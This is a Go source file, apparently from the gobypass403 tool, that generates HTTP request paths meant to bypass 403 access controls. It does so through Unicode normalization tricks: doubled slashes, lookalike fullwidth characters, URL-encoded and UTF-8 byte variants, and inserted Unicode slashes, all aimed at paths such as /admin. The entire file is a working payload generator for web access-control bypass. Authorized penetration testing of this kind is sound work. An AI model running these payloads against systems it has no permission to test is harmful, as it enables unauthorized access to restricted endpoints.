package payload

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

const (
	// maxNormalizations limits the number of Unicode normalization mappings used per character
	// to control payload explosion. Can be made into a CLI parameter in the future.
	maxNormalizations = 10
)

/*
GenerateUnicodePathNormalizationsPayloads generates payloads based on Unicode
normalization bypass techniques, targeting path characters with unicode variants.

The function uses unicode_normalization_map.json which contains mappings from ASCII to
Unicode characters that normalize to the ASCII character.

Payload generation techniques include:
 1. **Double Slash Variations:** Inserts an extra slash at each path separator
    position one by one (e.g., `/admin//login`) and creates a variant where all
    slashes are doubled (e.g., `//admin//login`).
 2. **Full Path Character Variations:** Replaces path characters with their
    Unicode equivalents. For each character in the path with a known mapping,
    it generates variants by replacing both single occurrences and all occurrences.
    Each replacement is tested in three forms:
    - Raw Unicode (`/admin/logＥn`)
    - URL-encoded (`/admin/log%EF%BC%A5n`)
    - UTF-8 bytes (`/admin/log\\xEF\\xBC\\xA5n`)
 3. **Path Segment Character Variations:** Iterates through each path segment
    (e.g., `admin`, `login`) and systematically replaces characters within it.
    This includes comprehensive replacement of the first and last characters, as
    well as replacing each character in the segment one by one.
 4. **Unicode Slash Insertion:** Takes Unicode equivalents of the slash character
    (`/`) and inserts them next to existing slashes in the path, creating
    variants like `/admin/(unicode_slash)login`.
 5. **Full Segment Unicode Variations:** For each path segment, creates a fully
    Unicode-fied version (e.g., `/admin` -> `/ＡＤＭＩＮ`). It then generates
    payloads by replacing each segment individually, and finally by replacing
    all segments at once. Both raw and URL-encoded variants are generated.

All variations preserve the original query string if present.
*/

// UnicodeMapping represents a single Unicode character that normalizes to an ASCII character
type UnicodeMapping struct {
	Unicode         string `json:"unicode"`
	UTF8Bytes       string `json:"utf8_bytes"`
	URLEncoded      string `json:"url_encoded"`
	NormalizeAs     string `json:"normalizes_as"`
	NormalizesAsHex string `json:"normalizes_as_hex"`
	Form            string `json:"form"`
}

// OrderedCharMap represents an ASCII character and its Unicode mappings
type OrderedCharMap struct {
	ASCII    int              `json:"ascii"`
	Char     string           `json:"char"`
	Mappings []UnicodeMapping `json:"mappings"`
}

// ReadUnicodeCharMap reads the unicode_normalization_map.json file
func ReadUnicodeCharMap() ([]OrderedCharMap, error) {
	// Try reading from local directory first
	content, err := ReadPayloadsFromJSONFile("unicode_normalization_map.json")
	if err != nil {
		return nil, fmt.Errorf("failed to read unicode_normalization_map.json: %w", err)
	}

	var charMap []OrderedCharMap
	if err := json.Unmarshal(content, &charMap); err != nil {
		return nil, fmt.Errorf("failed to unmarshal unicode_normalization_map.json: %w", err)
	}

	return charMap, nil
}

func (pg *PayloadGenerator) GenerateUnicodePathNormalizationsPayloads(targetURL string, bypassModule string) []BypassPayload {
	var jobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().BypassModule(bypassModule).Msgf("Failed to parse URL: %v", err)
		return jobs
	}

	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Read the unicode character map
	charMap, err := ReadUnicodeCharMap()
	if err != nil {
		GB403Logger.Error().BypassModule(bypassModule).Msgf("Failed to read unicode_char_map.json: %v", err)
		return jobs
	}

	// Build a more efficient lookup map: ASCII int -> []UnicodeMapping
	asciiToMappings := make(map[int][]UnicodeMapping)
	for _, entry := range charMap {
		asciiToMappings[entry.ASCII] = entry.Mappings
	}

	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	uniquePaths := make(map[string]struct{}) // Track generated URIs to avoid duplicates

	// Helper to add a job if the URI is unique
	addJob := func(uri string) {
		if _, exists := uniquePaths[uri]; !exists {
			uniquePaths[uri] = struct{}{}
			job := baseJob
			job.RawURI = uri
			job.PayloadToken = GeneratePayloadToken(job)
			jobs = append(jobs, job)
		}
	}

	// --- 1. Double-slash variations ---
	segments := strings.Split(path, "/")
	if len(segments) > 1 {
		// Insert double slashes at each path separator
		for i := 1; i < len(segments); i++ {
			if segments[i] == "" {
				continue // Skip empty segments
			}

			// Create path with double slash
			var doubleSlashPath strings.Builder
			doubleSlashPath.WriteString("/")
			for j := 1; j < len(segments); j++ {
				if j == i {
					doubleSlashPath.WriteString("/") // Extra slash
				}
				doubleSlashPath.WriteString(segments[j])
				if j < len(segments)-1 && segments[j] != "" {
					doubleSlashPath.WriteString("/")
				}
			}

			addJob(doubleSlashPath.String() + query)
		}

		// All slashes doubled
		var allDoubleSlashPath strings.Builder
		allDoubleSlashPath.WriteString("/")
		for j := 1; j < len(segments); j++ {
			if segments[j] != "" {
				allDoubleSlashPath.WriteString("/") // Extra slash
				allDoubleSlashPath.WriteString(segments[j])
				if j < len(segments)-1 {
					allDoubleSlashPath.WriteString("/")
				}
			}
		}

		addJob(allDoubleSlashPath.String() + query)
	}

	// --- 2. Unicode path character variations ---

	// 2.1 Find all characters in the path
	uniqueChars := make(map[int]bool)
	for _, r := range path {
		// Only handle ASCII chars that have Unicode mappings
		if r <= 127 {
			if mappings, exists := asciiToMappings[int(r)]; exists && len(mappings) > 0 {
				uniqueChars[int(r)] = true
			}
		}
	}

	// 2.2 For each unique character in the path
	for charCode := range uniqueChars {
		mappings := asciiToMappings[charCode]
		charStr := string(rune(charCode))

		// Limit mappings to control payload explosion
		limitedMappings := mappings
		if len(mappings) > maxNormalizations {
			limitedMappings = mappings[:maxNormalizations]
		}

		// For each Unicode mapping of this character
		for _, mapping := range limitedMappings {
			// Single replacement - Replace one occurrence at a time
			pathRunes := []rune(path)
			for i, r := range pathRunes {
				if int(r) == charCode {
					// Raw Unicode replacement
					rawPath := string(pathRunes[:i]) + mapping.Unicode + string(pathRunes[i+1:])
					addJob(rawPath + query)

					// URL-encoded replacement
					encodedPath := string(pathRunes[:i]) + mapping.URLEncoded + string(pathRunes[i+1:])
					addJob(encodedPath + query)

					// UTF-8 bytes replacement
					bytesPath := string(pathRunes[:i]) + mapping.UTF8Bytes + string(pathRunes[i+1:])
					addJob(bytesPath + query)
				}
			}

			// Replace all occurrences of this character
			rawAllPath := strings.ReplaceAll(path, charStr, mapping.Unicode)
			addJob(rawAllPath + query)

			encodedAllPath := strings.ReplaceAll(path, charStr, mapping.URLEncoded)
			addJob(encodedAllPath + query)

			bytesAllPath := strings.ReplaceAll(path, charStr, mapping.UTF8Bytes)
			addJob(bytesAllPath + query)
		}
	}

	// --- 3. Path segment character variations ---
	if len(segments) > 1 {
		for i := 1; i < len(segments); i++ {
			segment := segments[i]
			if segment == "" {
				continue
			}

			segmentRunes := []rune(segment)

			// 3.1 First character variations
			if len(segmentRunes) > 0 {
				firstChar := segmentRunes[0]
				if mappings, exists := asciiToMappings[int(firstChar)]; exists {
					// Limit mappings to control payload explosion
					limitedMappings := mappings
					if len(mappings) > maxNormalizations {
						limitedMappings = mappings[:maxNormalizations]
					}

					for _, mapping := range limitedMappings {
						// Create a new path with this segment's first char replaced
						newSegment := mapping.Unicode + string(segmentRunes[1:])
						newPath := createPathWithReplacedSegment(segments, i, newSegment)
						addJob(newPath + query)

						// URL-encoded version
						encodedSegment := mapping.URLEncoded + string(segmentRunes[1:])
						encodedPath := createPathWithReplacedSegment(segments, i, encodedSegment)
						addJob(encodedPath + query)

						// UTF-8 bytes version
						bytesSegment := mapping.UTF8Bytes + string(segmentRunes[1:])
						bytesPath := createPathWithReplacedSegment(segments, i, bytesSegment)
						addJob(bytesPath + query)
					}
				}
			}

			// 3.2 Last character variations
			if len(segmentRunes) > 1 {
				lastChar := segmentRunes[len(segmentRunes)-1]
				if mappings, exists := asciiToMappings[int(lastChar)]; exists {
					// Limit mappings to control payload explosion
					limitedMappings := mappings
					if len(mappings) > maxNormalizations {
						limitedMappings = mappings[:maxNormalizations]
					}

					for _, mapping := range limitedMappings {
						// Create a new path with this segment's last char replaced
						newSegment := string(segmentRunes[:len(segmentRunes)-1]) + mapping.Unicode
						newPath := createPathWithReplacedSegment(segments, i, newSegment)
						addJob(newPath + query)

						// URL-encoded version
						encodedSegment := string(segmentRunes[:len(segmentRunes)-1]) + mapping.URLEncoded
						encodedPath := createPathWithReplacedSegment(segments, i, encodedSegment)
						addJob(encodedPath + query)

						// UTF-8 bytes version
						bytesSegment := string(segmentRunes[:len(segmentRunes)-1]) + mapping.UTF8Bytes
						bytesPath := createPathWithReplacedSegment(segments, i, bytesSegment)
						addJob(bytesPath + query)
					}
				}
			}

			// 3.3 Every character in the segment
			for j, char := range segmentRunes {
				if mappings, exists := asciiToMappings[int(char)]; exists {
					// Limit mappings to control payload explosion
					limitedMappings := mappings
					if len(mappings) > maxNormalizations {
						limitedMappings = mappings[:maxNormalizations]
					}

					for k := 0; k < len(limitedMappings); k++ {
						mapping := limitedMappings[k]

						// Create segment with this character replaced
						newRunes := make([]rune, len(segmentRunes))
						copy(newRunes, segmentRunes)
						newRunes[j] = []rune(mapping.Unicode)[0]

						newSegment := string(newRunes)
						newPath := createPathWithReplacedSegment(segments, i, newSegment)
						addJob(newPath + query)
					}
				}
			}
		}
	}

	// --- 4. Special case: Unicode insertions ---
	// Get slash mappings specifically
	slashMappings, exists := asciiToMappings[47] // '/'
	if exists && len(slashMappings) > 0 {
		// Limit mappings to control payload explosion
		limitedSlashMappings := slashMappings
		if len(slashMappings) > maxNormalizations {
			limitedSlashMappings = slashMappings[:maxNormalizations]
		}

		for i := 0; i < len(limitedSlashMappings); i++ {
			mapping := limitedSlashMappings[i]

			// Insert Unicode slash after each real slash
			pathRunes := []rune(path)
			for j := 0; j < len(pathRunes); j++ {
				if pathRunes[j] == '/' {
					// Raw Unicode insertion
					insertPath := string(pathRunes[:j+1]) + mapping.Unicode + string(pathRunes[j+1:])
					addJob(insertPath + query)

					// URL-encoded insertion
					encodedPath := string(pathRunes[:j+1]) + mapping.URLEncoded + string(pathRunes[j+1:])
					addJob(encodedPath + query)

					// UTF-8 bytes insertion
					bytesPath := string(pathRunes[:j+1]) + mapping.UTF8Bytes + string(pathRunes[j+1:])
					addJob(bytesPath + query)
				}
			}
		}
	}

	// --- 5. Full segment Unicode variations ---
	if len(segments) > 1 {
		unicodeSegmentsRaw := make([]string, len(segments))
		unicodeSegmentsEnc := make([]string, len(segments))
		canBeUnicodefied := make([]bool, len(segments))
		anyCanBeUnicodefied := false

		for i, segment := range segments {
			if segment == "" {
				continue
			}
			raw, enc := unicodefySegment(segment, asciiToMappings)
			if raw != segment {
				unicodeSegmentsRaw[i] = raw
				unicodeSegmentsEnc[i] = enc
				canBeUnicodefied[i] = true
				anyCanBeUnicodefied = true
			}
		}

		if anyCanBeUnicodefied {
			// 5.1 Replace one segment at a time
			for i := 1; i < len(segments); i++ {
				if canBeUnicodefied[i] {
					addJob(createPathWithReplacedSegment(segments, i, unicodeSegmentsRaw[i]) + query)
					addJob(createPathWithReplacedSegment(segments, i, unicodeSegmentsEnc[i]) + query)
				}
			}

			// 5.2 Replace all possible segments at once
			numReplacable := 0
			for _, can := range canBeUnicodefied {
				if can {
					numReplacable++
				}
			}

			if numReplacable > 1 {
				tempSegmentsRaw := make([]string, len(segments))
				copy(tempSegmentsRaw, segments)
				tempSegmentsEnc := make([]string, len(segments))
				copy(tempSegmentsEnc, segments)

				for i := 1; i < len(segments); i++ {
					if canBeUnicodefied[i] {
						tempSegmentsRaw[i] = unicodeSegmentsRaw[i]
						tempSegmentsEnc[i] = unicodeSegmentsEnc[i]
					}
				}
				allRawPath := "/" + strings.Join(tempSegmentsRaw[1:], "/")
				addJob(allRawPath + query)

				allEncPath := "/" + strings.Join(tempSegmentsEnc[1:], "/")
				addJob(allEncPath + query)
			}
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).
		Msgf("Generated %d unicode normalization payloads for %s", len(jobs), targetURL)
	return jobs
}

// unicodefySegment converts a string segment into its raw Unicode and URL-encoded equivalents.
// It uses the first available unicode mapping that's different from the original character.
func unicodefySegment(segment string, asciiToMappings map[int][]UnicodeMapping) (string, string) {
	var rawBuilder strings.Builder
	var encodedBuilder strings.Builder

	for _, r := range segment {
		if mappings, exists := asciiToMappings[int(r)]; exists && len(mappings) > 0 {
			// Find the first mapping that's actually different from the original character
			var selectedMapping *UnicodeMapping
			originalChar := string(r)

			for _, mapping := range mappings {
				if mapping.Unicode != originalChar {
					selectedMapping = &mapping
					break
				}
			}

			if selectedMapping != nil {
				rawBuilder.WriteString(selectedMapping.Unicode)
				encodedBuilder.WriteString(selectedMapping.URLEncoded)
			} else {
				// No different unicode mapping found, use original character
				rawBuilder.WriteRune(r)
				// For the encoded version, we must still encode the original character to maintain consistency
				encodedBuilder.WriteString(fmt.Sprintf("%%%02X", r))
			}
		} else {
			// No mapping found, use original character
			rawBuilder.WriteRune(r)
			// For the encoded version, we must still encode the original character to maintain consistency
			encodedBuilder.WriteString(fmt.Sprintf("%%%02X", r))
		}
	}
	return rawBuilder.String(), encodedBuilder.String()
}
